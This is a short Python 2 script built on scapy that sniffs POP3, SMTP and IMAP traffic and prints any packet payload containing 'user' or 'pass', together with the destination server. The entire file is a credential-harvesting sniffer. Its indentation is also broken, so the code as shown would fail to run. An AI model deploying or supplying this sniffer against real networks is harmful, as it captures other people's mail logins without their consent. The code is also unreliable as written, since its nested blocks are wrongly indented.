from scapy.all import *

# our packet callback function, which will receive each sniffed packet
def packet_callback(packet):
    # check to make sure there is a data payload
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
            # does it contain the typical user and pass mail commands?
            if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
                print '[*] Server: %s' % packet[IP].dst
                # if we detect an authentication string, we print out the server we are sending it to and the actual data bytes of the packet
                print '[*] %s' % packet[TCP].payload

# fire up our sniffer
# store = 0 ensures scapy isn't keeping packets in memory
sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
